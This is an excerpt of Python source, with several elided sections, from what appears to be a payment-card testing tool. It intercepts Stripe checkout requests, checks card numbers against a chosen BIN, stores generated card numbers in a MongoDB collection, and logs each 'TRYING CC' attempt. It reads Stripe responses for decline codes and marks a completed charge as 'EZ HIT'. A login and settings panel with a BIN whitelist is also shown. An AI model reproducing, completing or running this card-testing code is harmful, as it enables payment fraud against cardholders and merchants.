...
# Function to save generated content to the database
def save_to_database(gennedCC, user_settings):
    # Convert the gennedCC list into the desired string format
    gennedCC_str = '|'.join(gennedCC)  # Assuming gennedCC is a list of strings
    try:
        # Unique ID for the document where all gennedCC will be stored
        document_id = "unique_document_identifier"

        # Fetch the specific document by its unique ID
        document = userDatabase.generated_content.find_one({'_id': document_id})

        if document:
            # If the document exists, append gennedCC_str to its array
            userDatabase.generated_content.update_one(
                {'_id': document_id},
                {'$push': {'generated_content': gennedCC_str},
                 '$set': {'user_settings': user_settings, 'timestamp': datetime.datetime.utcnow()}}
            )
        else:
            # If the document doesn't exist, create it with the initial gennedCC
            new_document = {
                '_id': document_id,
                'generated_content': [gennedCC_str],
                'user_settings': user_settings,
                'timestamp': datetime.datetime.utcnow()
            }
            userDatabase.generated_content.insert_one(new_document)
		...
		try:
			if b"payment_method_data[card][number]" in req_body:
				...
				if not checkcc(req.getCurrentUser().get("settings").get("bin"), parsedbody["payment_method_data[card][number]"].replace(" ", "")):
					...
					save_to_database(gennedCC, req.getCurrentUser().get("settings"))


				req.addToLogs("light:blue:TRYING CC: "+parsedbody["payment_method_data[card][number]"].replace(" ", "")+"|"+parsedbody["payment_method_data[card][exp_month]"]+"|"+parsedbody["payment_method_data[card][exp_year]"])
				...
				req.addToLogs("light:blue:TRYING CC: "+parsedbody["card[number]"].replace(" ", "")+"|"+parsedbody["card[exp_month]"]+"|"+parsedbody["card[exp_year]"])
				...
				req.addToLogs("light:blue:TRYING CC: "+parsedbody["source_data[card][number]"].replace(" ", "")+"|"+parsedbody["source_data[card][exp_month]"]+"|"+parsedbody["source_data[card][exp_year]"])
	...
	try:
		if req.path.split("://", 1)[1].startswith("api.stripe.com/v1/payment_pages/"):
			if b'"decline_code": "' in res_body:
				req.addToLogs("Purple:Purple:CC DECLINED : "+(res_body.decode("utf-8")).split('"decline_code": "')[1].split('"')[0])
			elif b'"code": "' in res_body:
				req.addToLogs("Purple:Purple:CC DECLINED : "+(res_body.decode("utf-8")).split('"code": "')[1].split('"')[0])
			elif b'"completed": true' in res_body:
				req.addToLogs('green:lime:EZ HIT')
		...
		if not self.ishttps:
			...
			if self.path == "/saveSettings" and self.isAuthorized():
				try:
					...
					if jsonData["bin"].startswith("531462005") and self.getCurrentUser().get("username") not in bin_whitelist:
				...
				self.send_response_only(302, "Found")
				self.send_header("Location", "site\\settings.html")
				self.send_header("Content-Type", "text/html; charset=UTF-8")
				self.send_header("Content-Length", "0")
				self.end_headers()
			if self.path == "/":
			...
			if self.path == "/login" and self.command == "POST":
				...
				try:
					...
					if not (
						...
						self.send_response_only(302, "Found")
						self.send_header("Location", "site/wrongpassword.html")
						self.send_header("Content-Type", "text/html; charset=UTF-8")
						self.send_header("Content-Length", "0")
						self.end_headers()
						return
				...
				self.send_response_only(302, "Found")
				self.send_header("Location", "https://site/settings")
				self.send_header("Content-Type", "text/html; charset=UTF-8")
				self.send_header("Content-Length", "0")
				self.end_headers()
				return
